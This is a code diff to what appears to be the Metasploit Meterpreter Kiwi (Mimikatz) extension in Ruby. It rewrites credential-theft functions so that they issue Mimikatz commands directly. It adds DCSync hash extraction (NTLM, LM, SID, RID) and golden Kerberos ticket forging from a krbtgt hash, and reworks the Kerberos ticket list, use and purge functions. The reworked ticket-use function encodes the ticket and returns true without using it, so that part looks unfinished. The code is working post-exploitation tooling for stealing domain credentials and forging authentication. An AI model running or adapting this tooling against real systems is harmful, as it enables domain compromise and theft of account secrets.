@@ -23,43 +23,6 @@ module Kiwi
 class Kiwi < Extension
 
   #
-  # These are constants that identify the type of credential to dump
-  # from the target machine.
-  #
-  PWD_ID_SEK_ALLPASS   = 0
-  PWD_ID_SEK_WDIGEST   = 1
-  PWD_ID_SEK_MSV       = 2
-  PWD_ID_SEK_KERBEROS  = 3
-  PWD_ID_SEK_TSPKG     = 4
-  PWD_ID_SEK_LIVESSP   = 5
-  PWD_ID_SEK_SSP       = 6
-  PWD_ID_SEK_DPAPI     = 7
-
-  #
-  # List of names which represent the flags that are part of the
-  # dumped kerberos tickets. The order of these is important. Each
-  # of them was pulled from the Mimikatz 2.0 source base.
-  #
-  KERBEROS_FLAGS = [
-    "NAME CANONICALIZE",
-    "<unknown>",
-    "OK AS DELEGATE",
-    "<unknown>",
-    "HW AUTHENT",
-    "PRE AUTHENT",
-    "INITIAL",
-    "RENEWABLE",
-    "INVALID",
-    "POSTDATED",
-    "MAY POSTDATE",
-    "PROXY",
-    "PROXIABLE",
-    "FORWARDED",
-    "FORWARDABLE",
-    "RESERVED"
-  ].map(&:freeze).freeze
-
-  #
   # Typical extension initialization routine.
   #
   # @param client (see Extension#initialize)
@@ -73,6 +36,10 @@ class Kiwi < Extension
           'ext'  => self
         },
       ])
+
+    # by default, we want all output in base64, so fire that up
+    # first so that everything uses this down the track
+    exec_cmd('base64')
   end
 
   def exec_cmd(cmd)
@@ -80,7 +47,40 @@ class Kiwi < Extension
     request.add_tlv(TLV_TYPE_KIWI_CMD, cmd)
     response = client.send_request(request)
     output = response.get_tlv_value(TLV_TYPE_KIWI_CMD_RESULT)
-    output[output.index(cmd) + cmd.length + 1, output.length]
+    # remove the banner up to the prompt
+    output = output[output.index('mimikatz(powershell) #') + 1, output.length]
+    # return everything past the newline from here
+    output[output.index("\n") + 1, output.length]
+  end
+
+  def dcsync(domain_user)
+    exec_cmd("\"lsadump::dcsync /user:#{domain_user}\"")
+  end
+
+  def dcsync_ntlm(domain_user)
+    result = {
+      ntlm: '<NOT FOUND>',
+      lm: '<NOT FOUND>',
+      sid: '<NOT FOUND>',
+      rid: '<NOT FOUND>'
+    }
+
+    output = dcsync(domain_user)
+    return nil unless output.include?('Object RDN')
+
+    output.lines.map(&:strip).each do |l|
+      if l.start_with?('Hash NTLM: ')
+        result[:ntlm] = l.split(' ')[-1]
+      elsif l.start_with?('lm  - 0:')
+        result[:lm] = l.split(' ')[-1]
+      elsif l.start_with?('Object Security ID')
+        result[:sid] = l.split(' ')[-1]
+      elsif l.start_with?('Object Relative ID')
+        result[:rid] = l.split(' ')[-1]
+      end
+    end
+
+    result
   end
 
   def lsa_dump_secrets
@@ -258,111 +258,12 @@ class Kiwi < Extension
   end
 
   #
-  # Dump the LSA secrets from the target machine.
-  #
-  # @return [Hash<Symbol,Object>]
-  def lsa_dump
-    request = Packet.create_request('kiwi_lsa_dump_secrets')
-
-    response = client.send_request(request)
-
-    result = {
-      :major    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MAJ),
-      :minor    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MIN),
-      :compname => response.get_tlv_value(TLV_TYPE_KIWI_LSA_COMPNAME),
-      :syskey   => response.get_tlv_value(TLV_TYPE_KIWI_LSA_SYSKEY),
-      :nt5key   => response.get_tlv_value(TLV_TYPE_KIWI_LSA_NT5KEY),
-      :nt6keys  => [],
-      :secrets  => [],
-      :samkeys  => []
-    }
-
-    response.each(TLV_TYPE_KIWI_LSA_NT6KEY) do |k|
-      result[:nt6keys] << {
-        :id    => k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYID),
-        :value => k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYVALUE)
-      }
-    end
-
-    response.each(TLV_TYPE_KIWI_LSA_SECRET) do |s|
-      result[:secrets] << {
-        :name        => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NAME),
-        :service     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_SERV),
-        :ntlm        => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NTLM),
-        :current     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR),
-        :current_raw => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW),
-        :old         => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD),
-        :old_raw     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW)
-      }
-    end
-
-    response.each(TLV_TYPE_KIWI_LSA_SAM) do |s|
-      result[:samkeys] << {
-        :rid       => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_RID),
-        :user      => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_USER),
-        :ntlm_hash => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_NTLMHASH),
-        :lm_hash   => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_LMHASH)
-      }
-    end
-
-    result
-  end
-
-  #
-  # Convert a flag set to a list of string representations for the bit flags
-  # that are set.
-  #
-  # @param flags [Fixnum] Integer bitmask of Kerberos token flags.
-  #
-  # @return [Array<String>] Names of all set flags in +flags+. See
-  #   {KERBEROS_FLAGS}
-  def to_kerberos_flag_list(flags)
-    flags = flags >> 16
-    results = []
-
-    KERBEROS_FLAGS.each_with_index do |item, idx|
-      if (flags & (1 << idx)) != 0
-        results  << item
-      end
-    end
-
-    results
-  end
-
-  #
   # List available kerberos tickets.
   #
-  # @param export [Bool] Set to +true+ to export the content of each ticket
+  # @return [String]
   #
-  # @return [Array<Hash>]
-  #
-  def kerberos_ticket_list(export)
-    result = exec_cmd('kerberos::list')
-    # TODO figure out the structure and parse it
-    return result
-    export ||= false
-    request = Packet.create_request('kiwi_kerberos_ticket_list')
-    request.add_tlv(TLV_TYPE_KIWI_KERB_EXPORT, export)
-    response = client.send_request(request)
-
-    results = []
-
-    response.each(TLV_TYPE_KIWI_KERB_TKT) do |t|
-      results << {
-        :enc_type     => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_ENCTYPE),
-        :start        => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_START),
-        :end          => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_END),
-        :max_renew    => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_MAXRENEW),
-        :server       => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_SERVERNAME),
-        :server_realm => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_SERVERREALM),
-        :client       => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME),
-        :client_realm => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM),
-        :flags        => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_FLAGS),
-        :raw          => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
-      }
-    end
-
-    results
+  def kerberos_ticket_list
+    exec_cmd('kerberos::list')
   end
 
   #
@@ -373,10 +274,8 @@ class Kiwi < Extension
   # @return [void]
   #
   def kerberos_ticket_use(ticket)
-    request = Packet.create_request('kiwi_kerberos_ticket_use')
-    request.add_tlv(TLV_TYPE_KIWI_KERB_TKT_RAW, ticket, false, true)
-    client.send_request(request)
-    return true
+    base64_content = Rex::Text.encode(ticket)
+    true
   end
 
   #
@@ -386,35 +285,61 @@ class Kiwi < Extension
   #
   def kerberos_ticket_purge
     result = exec_cmd('kerberos::purge').strip
-    return 'Ticket(s) purge for current session is OK' == result
+    'Ticket(s) purge for current session is OK' == result
   end
 
   #
   # Create a new golden kerberos ticket on the target machine and return it.
   #
-  # @param user [String] Name of the user to create the ticket for.
-  # @param domain [String] Domain name.
-  # @param sid [String] SID of the domain.
-  # @param tgt [String] The kerberos ticket granting token.
-  # @param id [Fixnum] ID of the user to grant the token for.
-  # @param group_ids [Array<Fixnum>] IDs of the groups to assign to the user
+  # @param opts[:user] [String] Name of the user to create the ticket for.
+  # @param opts[:domain_name] [String] Domain name.
+  # @param opts[:domain_sid] [String] SID of the domain.
+  # @param opts[:krbtgt_hash] [String] The kerberos ticket granting token.
+  # @param opts[:id] [Fixnum] ID of the user to grant the token for.
+  # @param opts[:group_ids] [Array<Fixnum>] IDs of the groups to assign to the user
   #
-  # @return [String]
+  # @return [Array<Byte>]
   #
-  def golden_ticket_create(user, domain, sid, tgt, id = 0, group_ids = [])
-    request = Packet.create_request('kiwi_kerberos_golden_ticket_create')
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_USER, user)
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_DOMAIN, domain)
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_SID, sid)
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_TGT, tgt)
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_USERID, id)
+  def golden_ticket_create(opts={})
+    cmd = [
+      "\"kerberos::golden /user:",
+      opts[:user],
+      " /domain:",
+      opts[:domain_name],
+      " /sid:",
+      opts[:domain_sid],
+      " /krbtgt:",
+      opts[:krbtgt_hash],
+      "\""
+    ].join('')
 
-    group_ids.each do |g|
-      request.add_tlv(TLV_TYPE_KIWI_GOLD_GROUPID, g)
+    if opts[:id]
+      cmd << " /id:" + opts[:id].to_s
     end
 
-    response = client.send_request(request)
-    return response.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
+    if opts[:group_ids]
+      cmd << " /groups:" + opts[:group_ids]
+    end
+
+    output = exec_cmd(cmd)
+
+    return nil unless output.include?('Base64 of file')
+
+    saving = false
+    content = []
+    output.lines.each do |l|
+      if l.start_with?('Base64 of file')
+        saving = true
+      elsif saving
+        if l.start_with?('====')
+          next if content.length == 0
+          break
+        end
+        content << l
+      end
+    end
+
+    Rex::Text.decode_base64(content[1, content.length].join(''))
   end
 
   #
